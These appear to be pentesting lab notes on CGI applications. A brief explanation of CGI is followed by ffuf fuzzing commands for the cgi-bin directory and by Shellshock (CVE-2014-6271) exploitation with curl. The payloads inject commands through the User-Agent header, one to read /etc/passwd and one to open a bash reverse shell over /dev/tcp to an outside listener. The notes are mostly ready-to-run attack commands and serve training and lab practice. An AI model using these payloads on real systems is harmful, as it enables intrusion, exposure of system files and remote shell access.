A [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server. They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc.

![[Pasted image 20250211054842.png]]
### Footprinting + Enumeration
```bash
ffuf -w ~/opt/wordlists/directory-list-2.3-medium.txt -u http://10.129.204.227:8080/FUZZ
```

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi

ffuf -w /usr/share/wordlists/dirb/small.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi
```

### Exploitation
#### Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271))
```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.155/4443 0>&1' http://10.129.205.27/cgi-bin/access.cgi
```